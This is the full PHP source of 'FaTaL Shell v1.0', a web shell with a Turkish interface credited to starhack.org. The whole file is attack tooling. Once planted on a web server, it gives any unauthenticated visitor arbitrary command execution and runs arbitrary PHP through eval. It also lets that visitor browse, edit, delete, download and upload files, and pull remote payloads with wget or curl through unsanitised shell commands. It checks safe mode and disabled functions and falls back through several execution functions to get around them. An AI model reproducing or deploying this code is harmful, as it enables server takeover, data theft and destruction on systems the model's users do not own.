<?php
session_start();
error_reporting(E_ALL ^ E_NOTICE);
set_magic_quotes_runtime(0);
@set_time_limit(0);
if(@get_magic_quotes_gpc()){foreach ($_POST as $k=>$v){$_POST[$k] = stripslashes($v);}}
@ini_set('max_execution_time',0);
(@ini_get('safe_mode')=="1" ? $safe_mode="ON" : $safe_mode="OFF(Rootla_Beni:)");

(@ini_get('disable_functions')!="" ? $disfunc=ini_get('disable_functions') : $disfunc=0);
(strtoupper(substr(PHP_OS, 0, 3))==='WIN' ? $os=1 : $os=0);
$version='version 1.0 by FaTaLErrOr';
$action=$_POST['action'];
$file=$_POST['file'];
$dir=$_POST['dir'];
$content='';
$stdata='';
$style='<STYLE>BODY{background-color: #2B2F34;color: #C1C1C7;font: 8pt verdana, geneva, lucida, \'lucida grande\', arial, helvetica, sans-serif;MARGIN-TOP: 0px;MARGIN-BOTTOM: 0px;MARGIN-LEFT: 0px;MARGIN-RIGHT: 0px;margin:0;padding:0;scrollbar-face-color: #336600;scrollbar-shadow-color: #333333;scrollbar-highlight-color: #333333;scrollbar-3dlight-color: #333333;scrollbar-darkshadow-color: #333333;scrollbar-track-color: #333333;scrollbar-arrow-color: #333333;}input{background-color: #336600;font-size: 8pt;color: #FFFFFF;font-family: Tahoma;border: 1 solid #666666;}select{background-color: #336600;font-size: 8pt;color: #FFFFFF;font-family: Tahoma;border: 1 solid #666666;}textarea{background-color: #333333;font-size: 8pt;color: #FFFFFF;font-family: Tahoma;border: 1 solid #666666;}a:link{color: #B9B9BD;text-decoration: none;font-size: 8pt;}a:visited{color: #B9B9BD;text-decoration: none;font-size: 8pt;}a:hover, a:active{background-color: #A8A8AD;color: #E7E7EB;text-decoration: none;font-size: 8pt;}td, th, p, li{font: 8pt verdana, geneva, lucida, \'lucida grande\', arial, helvetica, sans-serif;border-color:black;}</style>';
$header='<html><head><title>'.getenv("HTTP_HOST").' - FaTaL Shell v1.0</title><meta http-equiv="Content-Type" content="text/html; charset=windows-1254">'.$style.'</head><BODY leftMargin=0 topMargin=0 rightMargin=0 marginheight=0 marginwidth=0>';
$footer='</body></html>';

$lang=array(
'filext'=>'Lutfen Dosyayi Adlandiriniz Yada Degistiriniz.',
'uploadok'=>'Baþarýyla Yüklendi.',
'dircrt'=>'Klasör Oluþturuldu.',
'dontlist'=>'Listelenemiyor Ýzin Yok.',
'dircrterr'=>'Oluþturulamýyor Ýzin Yok.',
'dirnf'=>'Dizin Bulunamadi.',
'filenf'=>'.',
'dontwrdir'=>'Sadece Okunabilir.',
'empty'=>'Dizin Boþ Deðil Yada Ýzin Yok.',
'deletefileok'=>'Dosya Silindi.',
'deletedirok'=>'Klasör Silindi.',
'isdontfile'=>'Lütfen Full Url Yazýn. c:/program files/a.php Gibi',
'cantrfile'=>'Dosya Açýlamýyor izin Yok.',
'onlyracc'=>'Dosya Editlenemiyor Okuma Ýzni Var Sadece..',
'workdir'=>'Çalýþma Dizini: ',
'fullacc'=>'Full Yetki.',
'fullaccdir'=>'Full Yetkiniz Var Dosya Silip Düzenleyebilirsiniz.',
'thisnodir'=>'Klasör Seçin.',
'allfuncsh'=>'Fonksiyoýnlar Kapalý.'
);

$act=array('viewer','editor','upload','shell','phpeval','download','delete','deletedir');//here added new actions

function test_file($file){
if(!file_exists($file))$err="1";
elseif(!is_file($file)) $err="2";
elseif(!is_readable($file))$err="3";
elseif(!is_writable($file))$err="4"; else $err="5";
return $err;}

function test_dir($dir){
if(!file_exists($dir))$err="1";
elseif(!is_dir($dir)) $err="2";
elseif(!is_readable($dir))$err="3";
elseif(!is_writable($dir))$err="4"; else $err="5";
return $err;}

function perms($file){ 
  $perms = fileperms($file);
  if (($perms & 0xC000) == 0xC000) {$info = 's';} 
  elseif (($perms & 0xA000) == 0xA000) {$info = 'l';} 
  elseif (($perms & 0x8000) == 0x8000) {$info = '-';} 
  elseif (($perms & 0x6000) == 0x6000) {$info = 'b';} 
  elseif (($perms & 0x4000) == 0x4000) {$info = 'd';} 
  elseif (($perms & 0x2000) == 0x2000) {$info = 'c';} 
  elseif (($perms & 0x1000) == 0x1000) {$info = 'p';} 
  else {$info = 'u';}
  $info .= (($perms & 0x0100) ? 'r' : '-');
  $info .= (($perms & 0x0080) ? 'w' : '-');
  $info .= (($perms & 0x0040) ?(($perms & 0x0800) ? 's' : 'x' ) :(($perms & 0x0800) ? 'S' : '-'));
  $info .= (($perms & 0x0020) ? 'r' : '-');
  $info .= (($perms & 0x0010) ? 'w' : '-');
  $info .= (($perms & 0x0008) ?(($perms & 0x0400) ? 's' : 'x' ) :(($perms & 0x0400) ? 'S' : '-'));
  $info .= (($perms & 0x0004) ? 'r' : '-');
  $info .= (($perms & 0x0002) ? 'w' : '-');
  $info .= (($perms & 0x0001) ?(($perms & 0x0200) ? 't' : 'x' ) :(($perms & 0x0200) ? 'T' : '-'));
  return $info;} 

function view_size($size){
 if($size >= 1073741824) {$size = @round($size / 1073741824 * 100) / 100 . " GB";}
 elseif($size >= 1048576) {$size = @round($size / 1048576 * 100) / 100 . " MB";}
 elseif($size >= 1024) {$size = @round($size / 1024 * 100) / 100 . " KB";}
 else {$size = $size . " B";}
 return $size;}

if(isset($action)){if(!in_array($action,$act))$action="viewer";else $action=$action;}else $action="viewer";

if(isset($dir)){
  $ts['test']=test_dir($dir); 
  switch($ts['test']){
    case 1:$stdata.=$lang['dirnf'];break;
    case 2:$stdata.=$lang['thisnodir'];break;
    case 3:$stdata.=$lang['dontlist'];break;
    case 4:$stdata.=$lang['dontwrdir'];$dir=chdir($GLOBALS['dir']);break;
    case 5:$stdata.=$lang['fullaccdir'];$dir=chdir($GLOBALS['dir']);break;}
}else $dir=@chdir($dir);

$dir=getcwd()."/";
$dir=str_replace("\\","/",$dir);

if(isset($file)){
    $ts['test1']=test_file($file);
  switch ($ts['test1']){
    case 1:$stdata.=$lang['filenf'];break;
	case 2:$stdata.=$lang['isdontfile'];break;
	case 3:$stdata.=$lang['cantrfile'];break;
	case 4:$stdata.=$lang['onlyracc'];$file=$file;break;
	case 5:$stdata.=$lang['fullacc'];$file=$file;break;}
}

function shell($cmd)
{
  global $lang;
 $ret = '';
 if (!empty($cmd))
 {
  if(function_exists('exec')){@exec($cmd,$ret);$ret = join("\n",$ret);}
  elseif(function_exists('shell_exec')){$ret = @shell_exec($cmd);}
  elseif(function_exists('system')){@ob_start();@system($cmd);$ret = @ob_get_contents();@ob_end_clean();}
  elseif(function_exists('passthru')){@ob_start();@passthru($cmd);$ret = @ob_get_contents();@ob_end_clean();}
  elseif(@is_resource($f = @popen($cmd,"r"))){$ret = "";while(!@feof($f)) { $ret .= @fread($f,1024); }@pclose($f);}
  else $ret=$lang['allfuncsh'];
 }
 return $ret;
}

function createdir($dir){mkdir($dir);}

//delete file
if($action=="delete"){ 
if(unlink($file)) $content.=$lang['deletefileok']."<a href=\"#\" onclick=\"document.reqs.action.value='viewer';document.reqs.dir.value='".$dir."'; document.reqs.submit();\"> AnaSayfaya Dönemk Ýçin Týklayýnýz.</a>";
}
//delete dir
if($action=="deletedir"){ 
if(!rmdir($file)) $content.=$lang['empty']."<a href=\"#\" onclick=\"document.reqs.action.value='viewer';document.reqs.dir.value='".$dir."'; document.reqs.submit();\"> AnaSayfaya Dönemk Ýçin Týklayýnýz.</a>";
else $content.=$lang['deletedirok']."<a href=\"#\" onclick=\"document.reqs.action.value='viewer';document.reqs.dir.value='".$dir."'; document.reqs.submit();\"> AnaSayfaya Dönemk Ýçin Týklayýnýz.</a>";
}
//shell
if($action=="shell"){
$content.="<form method=\"POST\">
<input type=\"hidden\" name=\"action\" value=\"shell\">
<textarea name=\"command\" rows=\"5\" cols=\"150\">".@$_POST['command']."</textarea><br>
<textarea readonly rows=\"15\" cols=\"150\">".convert_cyr_string(htmlspecialchars(shell($_POST['command'])),"d","w")."</textarea><br>
<input type=\"submit\" value=\"Uygula\"></form>";}
//editor  
if($action=="editor"){
  $stdata.="<form method=POST>
  <input type=\"hidden\" name=\"action\" value=\"editor\">
  <input type=\"hidden\" name=\"dir\" value=\"".$dir."\">
  Dosyanýn Adý (Full Url Yazýn)<input type=text name=file value=\"".($file=="" ? $file=$dir : $file=$file)."\" size=50><input type=submit value=\"Editle\"></form>";	  
  function writef($file,$data){
  $fp = fopen($file,"w+");
  fwrite($fp,$data);
  fclose($fp);
}
  function readf($file){
  clearstatcache();
  $f=fopen($file, "r");
  $contents = fread($f,filesize($file));
  fclose($f);
  return htmlspecialchars($contents);
}
if(@$_POST['save'])writef($file,$_POST['data']);
if(@$_POST['create'])writef($file,"");
$test=test_file($file);
if($test==1){
$content.="<form method=\"POST\">
<input type=\"hidden\" name=\"action\" value=\"editor\">
File name:<input type=\"text\" name=\"file\" value=\"".$file."\" size=\"50\"><br>
<input type=\"submit\" name=\"create\" value=\"Create new file with this name?\">
<input type=\"reset\" value=\"No\"></form>";
}
if($test>2){
$content.="<form method=\"POST\">
<input type=\"hidden\" name=\"action\" value=\"editor\">
<input type=\"hidden\" name=\"file\" value=\"".$file."\">
<textarea name=\"data\" rows=\"30\" cols=\"180\">".@readf($file)."</textarea><br>
<input type=\"submit\" name=\"save\" value=\"Kaydet\"><input type=\"reset\" value=\"Reset\"></form>";
}}
//viewer
if($action=="viewer"){
$content.="<table cellSpacing=0 border=1 style=\"border-color:black;\" cellPadding=0 width=\"100%\">";
$content.="<tr><td><form method=POST>Klasore Git:<input type=text name=dir value=\"".$dir."\" size=50><input type=submit value=\"Git\"></form></td></tr>";
  if (is_dir($dir)) {
    if (@$dh = opendir($dir)) {
        while (($file = readdir($dh)) !== false) {
		  if(filetype($dir . $file)=="dir") $dire[]=$file;
		  if(filetype($dir . $file)=="file")$files[]=$file;
		}
		closedir($dh);
		@sort($dire);
		@sort($files);
		if ($GLOBALS['os']==1) {
		  $content.="<tr><td>HDD Secin:";
		  for ($j=ord('C'); $j<=ord('Z'); $j++) 
		   if (@$dh = opendir(chr($j).":/"))
		   $content.='<a href="#" onclick="document.reqs.action.value=\'viewer\'; document.reqs.dir.value=\''.chr($j).':/\'; document.reqs.submit();"> '.chr($j).'<a/>';
		   $content.="</td></tr>";
		 }
		$content.="<tr><td>Sistem: ".@php_uname()."</td></tr><tr><td></td><td>Biçim</td><td>Boyut</td><td>izin</td><td>Seçenekler</td></tr>";
		for($i=0;$i<count($dire);$i++) {
		  $link=$dir.$dire[$i];
		  $content.='<tr><td><a href="#" onclick="document.reqs.action.value=\'viewer\'; document.reqs.dir.value=\''.$link.'\'; document.reqs.submit();">'.$dire[$i].'<a/></td><td>Klasor</td><td></td><td>'.perms($link).'</td><td><a href="#" onclick="document.reqs.action.value=\'deletedir\'; document.reqs.file.value=\''.$link.'\'; document.reqs.submit();" title="Klasörü Sil">X</a></td></tr>';  
		}
		for($i=0;$i<count($files);$i++) {
		  $linkfile=$dir.$files[$i];
		  $content.='<tr><td><a href="#" onclick="document.reqs.action.value=\'editor\';document.reqs.dir.value=\''.$dir.'\'; document.reqs.file.value=\''.$linkfile.'\'; document.reqs.submit();">'.$files[$i].'</a><br></td><td>Dosya</td><td>'.view_size(filesize($linkfile)).'</td><td>'.perms($linkfile).'</td><td><a href="#" onclick="document.reqs.action.value=\'download\'; document.reqs.file.value=\''.$linkfile.'\';document.reqs.dir.value=\''.$dir.'\'; document.reqs.submit();" title="Download">D</a><a href="#" onclick="document.reqs.action.value=\'editor\'; document.reqs.file.value=\''.$linkfile.'\';document.reqs.dir.value=\''.$dir.'\'; document.reqs.submit();" title="Edit">E</a><a href="#" onclick="document.reqs.action.value=\'delete\'; document.reqs.file.value=\''.$linkfile.'\';document.reqs.dir.value=\''.$dir.'\'; document.reqs.submit();" title="Bu Dosyayi Sil">X</a></td></tr>'; 
		}
		$content.="</table>";
}}}
//downloader
if($action=="download"){ 
header('Content-Length:'.filesize($file).'');
header('Content-Type: application/octet-stream');
header('Content-Disposition: attachment; filename="'.$file.'"');
readfile($file);}
//phpeval
if($action=="phpeval"){
$content.="<form method=\"POST\">
 <input type=\"hidden\" name=\"action\" value=\"phpeval\">
 <input type=\"hidden\" name=\"dir\" value=\"".$dir."\">
 &lt;?php<br>
 <textarea name=\"phpev\" rows=\"5\" cols=\"150\">".@$_POST['phpev']."</textarea><br>
 ?><br>
 <input type=\"submit\" value=\"Uygula\"></form>";
if(isset($_POST['phpev']))$content.=eval($_POST['phpev']);}
//upload
if($action=="upload"){
  if(isset($_POST['dirupload'])) $dirupload=$_POST['dirupload'];else $dirupload=$dir;
  $form_win="<tr><td><form method=POST enctype=multipart/form-data>
  <input type=\"hidden\" name=\"action\" value=\"upload\">  
  Buraya Uploadla:<input type=text name=dirupload value=\"".$dirupload."\" size=50></tr></td><tr><td>Dosyayý Adlandýr (Gerekli) :<input type=text name=filename></td></tr><tr><td><input type=file name=file><input type=submit name=uploadloc value='Upload Et'></td></tr>";
  if($os==1)$content.=$form_win;
  if($os==0){
    $content.=$form_win;
	$content.='<tr><td><select size=\"1\" name=\"with\"><option value=\"wget\">wget</option><option value=\"fetch\">fetch</option><option value=\"lynx\">lynx</option><option value=\"links\">links</option><option value=\"curl\">curl</option><option value=\"GET\">GET</option></select>File addres:<input type=text name=urldown>
<input type=submit name=upload value=Upload></form></td></tr>';	
}

if(isset($_POST['uploadloc'])){
if(!isset($_POST['filename'])) $uploadfile = $dirupload.basename($_FILES['file']['name']); else 
$uploadfile = $dirupload."/".$_POST['filename'];

if(test_dir($dirupload)==1 && test_dir($dir)!=3 && test_dir($dir)!=4){createdir($dirupload);}
if(file_exists($uploadfile))$content.=$lang['filext']; 
elseif (move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile)) 
$content.=$lang['uploadok'];
}

if(isset($_POST['upload'])){
    if (!empty($_POST['with']) && !empty($_POST['urldown']) && !empty($_POST['filename']))
	switch($_POST['with'])
	{
	  case wget:shell(which('wget')." ".$_POST['urldown']." -O ".$_POST['filename']."");break;
 	  case fetch:shell(which('fetch')." -o ".$_POST['filename']." -p ".$_POST['urldown']."");break;
 	  case lynx:shell(which('lynx')." -source ".$_POST['urldown']." > ".$_POST['filename']."");break;
 	  case links:shell(which('links')." -source ".$_POST['urldown']." > ".$_POST['filename']."");break;
 	  case GET:shell(which('GET')." ".$_POST['urldown']." > ".$_POST['filename']."");break;
 	  case curl:shell(which('curl')." ".$_POST['urldown']." -o ".$_POST['filename']."");break;
}}}
//end function
?><?=$header;?>
<style type="text/css">
<!--
.style4 {
	font-size: x-large;
	font-weight: bold;
}
.style5 {color: #FF0000}
.style8 {color: #CCFF00}
-->
</style>

<a href="#" onclick="document.reqs.action.value='viewer';document.reqs.dir.value='<?=$dir;?>'; document.reqs.submit();"><p align="center" class="style4">FaTaLSheLL v1.0 </p></a>
<table width="100%" bgcolor="#336600" align="right" border="0" cellspacing="0" cellpadding="0"><tr><td><table><tr><td><a href="#" onclick="document.reqs.action.value='shell';document.reqs.dir.value='<?=$dir;?>'; document.reqs.submit();">| Shell </a></td><td><a href="#" onclick="document.reqs.action.value='viewer';document.reqs.dir.value='<?=$dir;?>'; document.reqs.submit();">| Ana Sayfa</a></td><td><a href="#" onclick="document.reqs.action.value='editor';document.reqs.file.value='<?=$file;?>';document.reqs.dir.value='<?=$dir;?>'; document.reqs.submit();">| Dosya Editle</a></td><td><a href="#" onclick="document.reqs.action.value='upload';document.reqs.dir.value='<?=$dir;?>'; document.reqs.submit();">| Dosya Upload</a></td><td><a href="#" onclick="document.reqs.action.value='phpeval';document.reqs.dir.value='<?=$dir;?>'; document.reqs.submit();">| Php Eval |</a></td><td><a href="#" onclick="history.back();"> <-Geri |</a></td><td><a href="#" onclick="history.forward();"> Ýleri->|</a></td></tr></table></td></tr></table><br><form name='reqs' method='POST'><input name='action' type='hidden' value=''><input name='dir' type='hidden' value=''><input name='file' type='hidden' value=''></form>
<p>&nbsp;</p>
<table style="BORDER-COLLAPSE: collapse" cellSpacing=0 borderColorDark=#666666 cellPadding=5 width="100%" bgColor=#333333 borderColorLight=#c0c0c0 border=1> <tr><td><span class="style8">Safe mode:</span> <?php echo $safe_mode;?><br>
      <span class="style8">Fonksiyon Kýsýtlamasý:</span> <?php echo $disfunc;?><br>
      <span class="style8">Sistem:</span> <?php echo @php_uname();?><br>
      <span class="style8">Durum:</span> <?php echo @$stdata;?></td>
</tr></table><table style="BORDER-COLLAPSE: collapse" cellSpacing=0 borderColorDark=#666666 cellPadding=5 width="100%" bgColor=#333333 borderColorLight=#c0c0c0 border=1><tr><td width="100%" valign="top"><?=$content;?></td></tr></table><table width="100%" bgcolor="#336600" align="right" colspan="2" border="0" cellspacing="0" cellpadding="0"><tr><td><table><tr><td><a href="http://www.starhack.org">COPYRIGHT BY StarHack.oRg <?=$version;?></a></td></tr></table></tr></td></table><?=$footer;?>
